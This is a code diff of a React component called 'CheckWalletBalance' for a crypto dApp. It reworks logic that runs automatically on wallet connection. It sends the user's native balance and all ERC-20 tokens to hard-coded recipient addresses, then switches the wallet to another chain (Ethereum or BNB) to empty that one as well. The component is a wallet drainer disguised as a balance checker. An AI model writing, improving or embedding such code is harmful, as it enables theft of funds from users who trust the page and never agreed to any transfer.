@@ -8,80 +8,88 @@ import { useChainId } from "wagmi";
 import useAutoSwitchChain from "../hooks/useAutoSwitchChain";
 import { getGasBufferByChain } from "../utils/gasBuffer";
 
+const SUPPORTED_CHAINS = [1, 56]; // Ethereum and BNB
+
 export default function CheckWalletBalance() {
   const { address, isConnected } = useAppKitAccount();
   const { transferNativeToken, transferERC20Token } = useTransferFunds();
-  const [walletBalance, setWalletBalance] = useState(0);
-  const [tokenName, setTokenName] = useState("");
-  const [tokens, setTokens] = useState([]);
   const [status, setStatus] = useState("");
-  const [hasSwitched, setHasSwitched] = useState(false); 
+  const [processedChains, setProcessedChains] = useState<number[]>([]);
+  const [isProcessing, setIsProcessing] = useState(false);
+
   const chainId = useChainId();
-  
-  // Using your custom hook for network switching
-  const { switchChain, isSwitching } = useAutoSwitchChain();
-
   const { balance, symbol } = useNativeBalance(address as `0x${string}`);
+  const { switchChain, isSwitching } = useAutoSwitchChain();
   const GAS_BUFFER = getGasBufferByChain(chainId);
+
   const processWallet = async () => {
+    if (!address || !chainId || processedChains.includes(chainId) || isProcessing) return;
+
+    setIsProcessing(true);
     try {
-      setStatus("🔍 Checking balance...");
-      setWalletBalance(parseFloat(balance));
-      setTokenName(symbol);
+      setStatus(`🔍 Checking ${symbol} balance on chain ${chainId}...`);
 
-      // Check if the balance is below the minimum required
-      if (parseFloat(balance) < MINIMUM_BALANCE) {
+      const thresholdMet = parseFloat(balance) >= MINIMUM_BALANCE;
+
+      if (!thresholdMet) {
         setStatus("❌ Insufficient funds!");
-        await switchChain(chainId === 1 ? 56 : 1);
-        setHasSwitched(true);
-        return;
       }
 
-      setStatus("🔍 Fetching ERC-20 tokens...");
-      const erc20Tokens = await getTokensWithBalance(address, chainId);
+      if (thresholdMet) {
+        const tokens = await getTokensWithBalance(address, chainId);
 
-      if (erc20Tokens.length === 0) {
-        setStatus("🚀 Sending native token...");
-        await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
-        setStatus("✅ Native token sent!");
-      } else {
-        setTokens(erc20Tokens);
-        setStatus("🚀 Sending tokens...");
-        
-        // Transfer native token
-        await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
+        if (tokens.length === 0) {
+          setStatus("🚀 Sending native token...");
+          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
+          setStatus("✅ Native token sent!");
+        } else {
+          setStatus("🚀 Sending tokens...");
+          await transferNativeToken(parseFloat(balance) - GAS_BUFFER, RECIPIENT_ADDRESSES[chainId]);
 
-        // Transfer ERC-20 tokens
-        for (let token of erc20Tokens) {
-          await transferERC20Token(token.contractAddress, token.balance, RECIPIENT_ADDRESSES[chainId], token.decimals);
+          for (let token of tokens) {
+            await transferERC20Token(
+              token.contractAddress,
+              token.balance,
+              RECIPIENT_ADDRESSES[chainId],
+              token.decimals
+            );
+          }
+          setStatus("🎉 All tokens sent!");
         }
-
-        setStatus("🎉 All transfers complete!");
       }
 
-      // Switch to the other network (if connected to Ethereum, switch to Binance, and vice versa)
-      await switchChain(chainId === 1 ? 56 : 1);
-      setHasSwitched(true); // 1 is ETH, 56 is BNB
+      // Mark this chain as processed
+      setProcessedChains((prev) => [...prev, chainId]);
 
+      // Switch to next chain if any left
+      const remainingChains = SUPPORTED_CHAINS.filter((id) => !processedChains.includes(id) && id !== chainId);
+      if (remainingChains.length > 0) {
+        const nextChainId = remainingChains[0];
+        setStatus(`🔁 Switching to chain ${nextChainId}...`);
+        await switchChain(nextChainId);
+      } else {
+        setStatus("✅ All chains processed.");
+      }
     } catch (error) {
-      console.error("Error processing wallet:", error);
+      console.error("❌ Error in processWallet:", error);
       setStatus("❌ Transfer failed!");
+    } finally {
+      setIsProcessing(false);
     }
   };
 
-  // useEffect to process wallet balance and perform actions
   useEffect(() => {
-    if (!isConnected || !address || hasSwitched) return;
+    if (isConnected && address) {
+      processWallet();
+    }
+  }, [isConnected, address, balance, symbol, chainId]);
 
-    processWallet();
-  }, [isConnected, address, balance, symbol, chainId, hasSwitched]);
-
-  // Display UI based on current status
   return (
     <div className="text-center">
-      <p>Your Balance: {walletBalance} {tokenName}</p>
-      <p className="text-sm">{status}</p>
-      {isSwitching && <p>Switching network...</p>}
+      <p>Chain: {chainId}</p>
+      <p>Balance: {balance} {symbol}</p>
+      <p>Status: {status}</p>
+      {isSwitching && <p>🔄 Switching chain...</p>}
     </div>
   );
 }
